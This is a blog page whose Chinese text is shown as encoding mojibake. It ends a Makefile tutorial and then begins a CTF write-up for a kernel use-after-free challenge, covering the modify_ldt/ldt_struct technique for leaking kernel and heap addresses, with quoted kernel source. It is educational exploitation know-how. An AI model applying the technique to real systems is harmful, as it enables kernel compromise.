<h2 id="è°ƒç”¨shell"><a href="#è°ƒç”¨shell" class="headerlink" title="è°ƒç”¨shell"></a>è°ƒç”¨shell</h2><p>åœ¨makefileä¸­å¯ä»¥ä½¿ç”¨<code>ifndef endif</code>æ¥æ·»åŠ é»˜è®¤å€¼</p>
<p>åœ¨makefileä¸­å¯ä»¥åœ¨ç›®æ ‡ä»¥å¤–æ‰§è¡Œshellå‘½ä»¤ï¼Œå¦‚ä¸‹</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$(<span class="built_in">shell</span> ls)</span></span><br><span class="line"><span class="section">a:</span></span><br><span class="line">	echo <span class="variable">$(A)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨makefileä¸­è¿˜å¯ä»¥è°ƒç”¨å…¶ä»–makefile,ä¸æ˜¯åƒä¸Šé¢é‚£æ ·çš„åŒ…å«ï¼Œè€Œæ˜¯è°ƒç”¨ï¼Œå› ä¸ºå¾ˆæœ‰æ—¶å€™ä¸åŒæ¨¡å—æœ‰ä¸åŒçš„makefile,è¦æƒ³ç›´æ¥å…¨éƒ¨å°±ä¸€èµ·ç¼–è¯‘ï¼Œå¯ä»¥å†å†™ä¸ªmakefileè°ƒç”¨ä»–ä»¬ï¼Œè°ƒç”¨è§„åˆ™å…¶å®å°±æ˜¯shellæŒ‡ä»¤</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	make -C ./makefile</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908155748153.png" alt="image-20220908155748153"></p>
<h2 id="æ¡ä»¶åˆ¤æ–­-amp-å¾ªç¯"><a href="#æ¡ä»¶åˆ¤æ–­-amp-å¾ªç¯" class="headerlink" title="æ¡ä»¶åˆ¤æ–­&amp;å¾ªç¯"></a>æ¡ä»¶åˆ¤æ–­&amp;å¾ªç¯</h2><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908160944829.png" alt="image-20220908160944829" style="zoom:200%;" />

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908161145932.png" alt="image-20220908161145932"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908161321317.png" alt="image-20220908161321317"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908163409283.png" alt="image-20220908163409283"></p>
<h2 id="è‡ªå®šä¹‰å‡½æ•°"><a href="#è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="è‡ªå®šä¹‰å‡½æ•°"></a>è‡ªå®šä¹‰å‡½æ•°</h2><p>å˜é‡ï¼Œif,å¾ªç¯å’Œå‡½æ•°éƒ½æœ‰äº†ï¼Œæ„Ÿè§‰å’Œä¸€é—¨è¯­è¨€éƒ½å·®ä¸å¤šäº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908163840185.png" alt="image-20220908163840185"></p>
<h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908165302800.png" alt="image-20220908165302800"></p>
<p>ä¾‹å­ï¼ŒæŠŠäºŒè¿›åˆ¶ç¨‹åºæ”¾ç½®åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶ååœ¨/binç›®å½•ä¸­æ”¾ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åºçš„è½¯é“¾æ¥ï¼Œç„¶åå°±å¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸­è°ƒç”¨è¿™ä¸ªç¨‹åºäº†ã€‚</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TARGET:=006_main</span><br><span class="line">OBJ:=<span class="variable">$(TARGET)</span>.o</span><br><span class="line"></span><br><span class="line">CC:=g++</span><br><span class="line"></span><br><span class="line">PATH:=/tmp/006_main/</span><br><span class="line">BIN:=/usr/local/bin/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">install:<span class="variable">$(TARGET)</span></span></span><br><span class="line">	if [ -d <span class="variable">$(PATH)</span> ];\</span><br><span class="line">		then echo <span class="variable">$(PATH)</span> exist; \</span><br><span class="line">	<span class="keyword">else</span> \</span><br><span class="line">	  	/bin/mkdir <span class="variable">$(PATH)</span>;\</span><br><span class="line">	  	/bin/cp <span class="variable">$(TARGET)</span> <span class="variable">$(PATH)</span>;\</span><br><span class="line">  		/bin/ln -sv <span class="variable">$(PATH)</span><span class="variable">$(TARGET)</span> <span class="variable">$(BIN)</span>;\</span><br><span class="line">  	fi;</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(RM)</span> -rf <span class="variable">$(PATH)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean install</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-08-12 21:57:21" itemprop="dateCreated datePublished" datetime="2022-08-12T21:57:21+08:00">2022-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-08-18 22:47:26" itemprop="dateModified" datetime="2022-08-18T22:47:26+08:00">2022-08-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è“å¸½æ¯åŠå†³èµ›-Smurfså¤ç°"><a href="#è“å¸½æ¯åŠå†³èµ›-Smurfså¤ç°" class="headerlink" title="è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°"></a>è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æä¾›äº†del,add,editï¼Œå…¶ä¸­æœ‰æ¯”è¾ƒè£¸çš„uaf,editå¯ä»¥ç¼–è¾‘å‰å…«ä¸ªå­—èŠ‚,ä½†æ˜¯æ²¡æœ‰æ³„éœ²åœ°å€çš„åŠŸèƒ½ï¼Œåœ¨æ¯”èµ›æœŸé—´æˆ‘é‡‡ç”¨<code>seq_operations</code>çš„<code>start</code>æŒ‡é’ˆæ¥æ§åˆ¶ç¨‹åºæµï¼Œkernelçš„åœ°å€éšæœºåŒ–åªæœ‰9ä½ï¼Œæ‰€ä»¥é‡‡ç”¨ç¡¬çˆ†çš„ç­–ç•¥æ‰“è¿œç¨‹ï¼Œå¯æƒœè„¸é»‘ï¼Œçˆ†äº†ä¸¤ä¸ªå°æ—¶ï¼Œåˆ°æ¯”èµ›ç»“æŸè¿˜æ˜¯æ²¡æœ‰çˆ†å‡ºæ¥ã€‚è™½æœ‰ä¸€å®šå¯è¡Œæ€§ä½†æ˜¯æ­£è§£è‚¯å®šä¸æ˜¯è¿™æ ·ï¼Œå®˜æ–¹è§£å‡ºæ¥çœ‹äº†çœ‹å‘ç°éå¸¸æœ‰å«é‡‘é‡ï¼Œé‚å¤ç°ä¸€æ³¢ã€‚</p>
<h2 id="ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ "><a href="#ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ " class="headerlink" title="ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ "></a>ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ </h2><h3 id="è¿›ç¨‹ldt"><a href="#è¿›ç¨‹ldt" class="headerlink" title="è¿›ç¨‹ldt"></a>è¿›ç¨‹ldt</h3><p>è™½ç„¶é¢˜ç›®çš„åˆ©ç”¨æ€è·¯å’Œè¿™ä¸ªå…³ç³»ä¸æ˜¯å¾ˆå¤§ï¼Œä½†çœ‹éƒ½çœ‹äº†å°±è®°å½•ä¸€ä¸‹ã€‚</p>
<p>ä»‹ç»LDTå°±ä¸å¾—ä¸ä»‹ç»GDTäº†ï¼Œç®€è€Œè¨€ä¹‹ï¼ŒGDTæ˜¯å…¨å±€æè¿°ç¬¦è¡¨ï¼Œè€ŒLDTæ˜¯å±€éƒ¨æè¿°ç¬¦è¡¨ï¼Œåœ¨kvmçš„å­¦ä¹ ä¸­æ¥è§¦è¿‡GDT,ä½†æ˜¯å½“æ—¶ä¸ç†è§£ä¸ºä»€ä¹ˆåŠ äº†è¿™ä¸ªä¸œè¥¿ä¸ºä»€ä¹ˆå°±å¯ä»¥å®ç°ä¿æŠ¤äº†ï¼Œåœ¨è¯¢é—®<code>Alex</code>å­¦é•¿ä¸€æ³¢åç»ˆäºææ‡‚ï¼Œä»–æ˜¯æ€ä¹ˆå®ç°å†…å­˜ä¿æŠ¤ä»¥åŠè¿›ç¨‹ä½éš”ç¦»çš„äº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220812195333645.png" alt="image-20220812195333645"></p>
<p>ä¸€ä¸ªcpuæœ‰ä¸€ä¸ªå…¨å±€æè¿°ç¬¦è¡¨GDTï¼ŒGDTç›¸å½“äºä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸€ä¸ªå…ƒç´ å°±æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œä¸€ä¸ªæ®µæè¿°ç¬¦å°±è®°å½•è¿™ä¸ªæ®µçš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚æ®µçš„åŸºåœ°å€æ®µçš„å¤§å°ä¹‹ç±»çš„ï¼Œè¿™ä¸ªæ•°ç»„çš„åœ°å€å­˜å‚¨åœ¨å¯„å­˜å™¨<code>GDTR</code>ä¸­ï¼Œç„¶ååœ¨æ®µå¯„å­˜å™¨ä¸­å°±ä¸ä¼šè®°å½•æ®µçš„å…·ä½“ä¿¡æ¯ï¼Œè€Œæ˜¯è®°å½•ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼Œé€šè¿‡è¿™ä¸ªæ®µé€‰æ‹©å­å®Œæˆå¯¹æŸä¸€ä¸ªæ®µæè¿°ç¬¦çš„ç´¢å¼•</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/9r91dw9haq.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>æ®µé€‰æ‹©å­åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼Œæè¿°ç´¢å¼•ç¬¦ï¼ŒTL,RPLï¼Œå…¶ä¸­æè¿°ç´¢å¼•ç¬¦å°±æ˜¯ç´¢å¼•æ®µæè¿°ç¬¦çš„ï¼ŒTLæœ‰ä¸¤ç§å¯èƒ½ï¼Œ0ä»£è¡¨åœ¨GDTä¸­å¯»æ‰¾ï¼Œ1ä»£è¡¨åœ¨LDTä¸­å¯»æ‰¾ã€‚</p>
<p>LDTæ˜¯åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å®ç°è¿›ç¨‹é—´éš”ç¦»çš„é‡è¦çš„æœºåˆ¶ï¼Œæ¯ä¸ªLDTéƒ½è®°å½•ä¸€ä¸ªè¿›ç¨‹çš„æ®µçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬cs,ds,ssä¹‹ç±»çš„ï¼Œä¹Ÿæ˜¯ç”±æ®µæè¿°ç¬¦ç»„æˆçš„æ•°ç»„ï¼Œä»–æ˜¯ä¸€æ®µå†…å­˜ï¼Œä¹Ÿå¯ä»¥çœ‹åšä¸€ä¸ªæ®µï¼Œæ‰€ä»¥å¯ä»¥åœ¨GDTä¸­ç”¨ä¸€ä¸ªæè¿°ç¬¦å»è®°å½•ä»–ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå¯„å­˜å™¨LDTRï¼Œä¸è¿‡ä»–ä¸æ˜¯è®°å½•LDTçš„åŸºåœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªé€‰æ‹©å­ï¼Œå½“æ®µå¯„å­˜å™¨çš„TLä½æ˜¯1çš„è¯ï¼Œä»£è¡¨å°±æ˜¯LDTé€‰æ‹©ï¼ŒCPUä¼šæ ¹æ®LDTRä½œä¸ºä¸€ä¸ªç´¢å¼•å»GDTè¡¨ä¸­æ‰¾æè¿°ç¬¦ï¼Œæ‰¾è§çš„æè¿°ç¬¦å°±æ˜¯å¯¹åº”ä¸€ä¸ªLDTåœ°å€ï¼Œç„¶åå†ç”¨å¯¹åº”çš„æ®µå¯„å­˜å™¨çš„indexæ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦ï¼Œå¯è§ï¼Œè¿›ç¨‹ä¹‹é—´çš„LDTRä¸ä¸€æ ·ï¼Œä»–ä»¬çš„LDTå°±ä¸ä¸€æ ·ï¼Œæ®µå¯„å­˜å™¨å°±ä¸ä¸€æ ·ï¼Œè¿›ç¨‹é—´å°±éš”ç¦»äº†ï¼Œæ¯”è¾ƒå½¢è±¡çš„æè¿°å¦‚ä¸‹å¦‚å›¾ã€‚</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/4icmuda124.jpeg?imageView2/2/w/1620" alt="img"></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1878670/czt9jkhxcl.png?imageView2/2/w/1620" alt="img"></p>
<h3 id="modify-ldt-ç³»ç»Ÿè°ƒç”¨"><a href="#modify-ldt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="modify_ldt ç³»ç»Ÿè°ƒç”¨"></a>modify_ldt ç³»ç»Ÿè°ƒç”¨</h3><h4 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h4><p>è¯¥ç»“æ„ä½“æ˜¯0x10å¤§å°çš„ï¼Œç„¶åå‰å…«ä¸ªå­—èŠ‚æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé€šè¿‡uafæˆ‘ä»¬å¾—åˆ°è¿™ä¸ªç»“æ„ä½“ï¼Œç„¶åé€šè¿‡editå¯ä»¥æ§åˆ¶å‰å…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶<code>entries</code>æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        nr_entries;</span><br><span class="line">    <span class="keyword">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code> struct desc_struct</code>å°±æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<h4 id="moddify-ldtç³»ç»Ÿè°ƒç”¨"><a href="#moddify-ldtç³»ç»Ÿè°ƒç”¨" class="headerlink" title="moddify_ldtç³»ç»Ÿè°ƒç”¨"></a>moddify_ldtç³»ç»Ÿè°ƒç”¨</h4><p>å¯ä»¥é€šè¿‡linuxæä¾›çš„<code>modity_ldt</code>æ¥è·å–æˆ–è€…ä¿®æ”¹å½“å‰è¿›ç¨‹çš„LDT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>moddify_ldtç³»ç»Ÿè°ƒç”¨ä¸€å…±æä¾›äº†å››ä¸ªåŠŸèƒ½ï¼Œå‚æ•°æœ‰ä¸‰ä¸ªï¼Œfun,ptr,bytecount,<code>ptr</code>æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç»“æ„ä½“ä¸º<code>user_desc</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>read_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line"> <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"> down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">  retval = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">  bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line"> entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"> <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">  entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">  retval = -EFAULT;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line">  <span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">  <span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">   retval = -EFAULT;</span><br><span class="line">   <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"> <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°ä¼šä½¿ç”¨<code>copy_to_user</code>æŠŠldt-&gt;entiresçš„å€¼æ‹·è´åˆ°ä¼ å…¥çš„<code>ptr</code>ä¸­ï¼Œå°±æ˜¯æŠŠè¿™ä¸ªè¿›ç¨‹çš„LDTæ‹·è´åˆ°<code>ptr</code>ä¸­ï¼Œå¦‚æœæ‹·è´ä¸æˆåŠŸï¼Œé‚£å°±ä¼šè¿”å›-1.æˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¿”å›å€¼åˆ¤æ–­æ˜¯å¦è¯»å–æˆåŠŸï¼Œä¹Ÿå°±æ˜¯å¯ä»¥çˆ†ç ´å‡ºheapæˆ–è€…kernelåœ°å€ã€‚</p>
<p><strong>write_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"> <span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> error = -EFAULT;</span><br><span class="line"> <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">  <span class="keyword">goto</span> 